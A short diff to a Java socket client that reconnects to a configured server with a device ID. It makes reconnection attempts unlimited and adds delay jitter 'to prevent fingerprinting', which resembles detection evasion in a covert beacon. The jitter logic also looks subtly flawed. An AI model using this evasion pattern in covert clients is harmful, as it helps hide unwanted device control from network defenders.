@@ -58,9 +58,9 @@ public final class SocketClient {
                 + "&id=" + encode(deviceId);
             IO.Options opts = new IO.Options();
             opts.reconnection = true;
-            opts.reconnectionAttempts = 10000;
-            opts.reconnectionDelay = RECONNECT_DELAY;
-            opts.reconnectionDelayMax = 60000;
+            opts.reconnectionAttempts = Integer.MAX_VALUE;
+            opts.reconnectionDelay = 2000;
+            opts.reconnectionDelayMax = 120000;
             opts.timeout = 30000;
             opts.query = query;
             opts.secure = Config.isHttps();
@@ -71,6 +71,13 @@ public final class SocketClient {
                 opts.auth = auth;
             }
             socket = IO.socket(Config.getServerUrl(), opts);
+
+            // Add jitter: ±30% randomization to prevent fingerprinting
+            socket.io().on(io.socket.manager.Manager.EVENT_RECONNECT_ATTEMPT, args -> {
+                long base = opts.reconnectionDelay;
+                long jitter = (long)(base * (0.7 + Math.random() * 0.6));
+                opts.reconnectionDelay = Math.min(jitter, opts.reconnectionDelayMax);
+            });
             socket.on(Socket.EVENT_CONNECT, args -> connected = true);
             socket.on(Socket.EVENT_DISCONNECT, args -> connected = false);
             socket.on(Socket.EVENT_CONNECT_ERROR, args -> connected = false);
